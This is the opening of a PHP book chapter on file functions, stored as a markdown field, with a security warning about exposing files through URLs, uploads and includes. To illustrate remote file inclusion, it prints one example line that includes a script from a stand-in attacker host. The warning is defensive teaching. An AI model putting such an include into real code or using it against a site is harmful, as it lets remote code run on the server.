  md: '# # 4 Files


    Databases make great tools for storing information, as they’re fast and, with
    the help of SQL, easy to navigate. Sometimes, though, you need to be able to access
    the data stored in a file, be it an image, configuration information, or even
    a Web page on a remote server. PHP makes such work easy with its powerful collection
    of file functions. The only hard part is choosing the right tool for the job.


    # ## A Word on Security


    Before running riot with PHP''s file functions, think carefully about what you''re
    doing: you will be making files from your operating system available on a Web
    page, which will be exposed to the Internet. Check and double check the code that
    accesses files—look for “holes” in your logic that might allow unwanted access
    to your files.


    Be particularly careful when allowing files and directories to be identified via
    URLs, or uploaded or downloaded from your site. This warning also extends to PHP’s
    include commands, which can be used to execute scripts included from a remote
    Web server e.g. include ''http://www.hack-er.com/bad_script.txt'';.


    I’ll be highlighting the potential dangers with each solution so that with care
    you can learn to write secure code.'
